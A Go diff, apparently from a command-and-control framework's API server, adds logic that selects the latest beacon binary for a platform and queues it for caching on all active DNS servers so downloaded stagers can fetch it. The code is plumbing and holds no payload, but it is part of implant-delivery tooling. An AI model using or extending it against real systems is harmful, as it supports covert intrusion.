@@ -329,6 +329,52 @@ func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) 
 		fmt.Printf("Build saved to: %s\n", savedPath)
 	}
 
+	// Queue cache for DNS servers (so they have the beacon ready when stager runs)
+	// Find the most recent client binary for this platform
+	clientBinaryID := ""
+	if req.ClientBinaryID != "" {
+		clientBinaryID = req.ClientBinaryID
+	} else {
+		// Auto-select most recent beacon for this platform
+		clientBinaries, err := api.db.GetClientBinaries()
+		if err == nil {
+			for _, binary := range clientBinaries {
+				if os, ok := binary["os"].(string); ok && os == req.Platform {
+					if id, ok := binary["id"].(string); ok {
+						clientBinaryID = id
+						break
+					}
+				}
+			}
+		}
+	}
+
+	if clientBinaryID != "" {
+		// Get all active DNS server IDs
+		dnsServers, err := api.db.GetDNSServers()
+		if err == nil {
+			var dnsServerIDs []string
+			for _, server := range dnsServers {
+				if status, ok := server["status"].(string); ok && status == "active" {
+					if id, ok := server["id"].(string); ok {
+						dnsServerIDs = append(dnsServerIDs, id)
+					}
+				}
+			}
+
+			if len(dnsServerIDs) > 0 {
+				// Queue cache for all DNS servers
+				err = api.db.QueueStagerCacheForDNSServers(clientBinaryID, dnsServerIDs)
+				if err != nil {
+					fmt.Printf("⚠️  Failed to queue cache: %v (stager will still work via on-demand caching)\n", err)
+				} else {
+					fmt.Printf("📦 Queued stager cache (%s) for %d DNS servers (will sync on next checkin)\n",
+						clientBinaryID, len(dnsServerIDs))
+				}
+			}
+		}
+	}
+
 	// Send binary as download
 	w.Header().Set("Content-Type", "application/octet-stream")
 	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"stager-%s%s\"", req.Platform, ext))
